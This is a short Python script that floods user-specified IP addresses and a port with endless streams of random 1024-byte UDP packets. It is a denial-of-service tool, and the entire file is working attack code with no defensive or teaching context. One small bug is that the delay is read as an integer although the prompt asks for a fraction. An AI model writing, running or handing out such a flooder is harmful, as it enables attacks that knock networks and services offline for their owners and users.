from socket import *
import random 
import time

listInputs=int(input("Specify how many IPs to target for flooding: "))
ip=[]
for x in range(listInputs):
    value=input("Enter the element value: ")    #e.g:192.168.1.1
    ip.append(value)
port=int(input("Enter the port number:  "))
delay=int(input("Specify the delay duration (manage the flooding [0-0.99]): "))

def dos(ip,port,delay):
    counter=0
    while True:
        
        for i in range(0,1000):
            for x in range(listInputs):
                dosSocket.sendto(payload,(ip[x],port))

        print("packet num %s the ip %s the port %s" %(counter,ip,port) )
        counter=counter+1000
        time.sleep(delay)

dosSocket= socket(AF_INET,SOCK_DGRAM)
payload=random._urandom(1024)
dos(ip,port,delay)
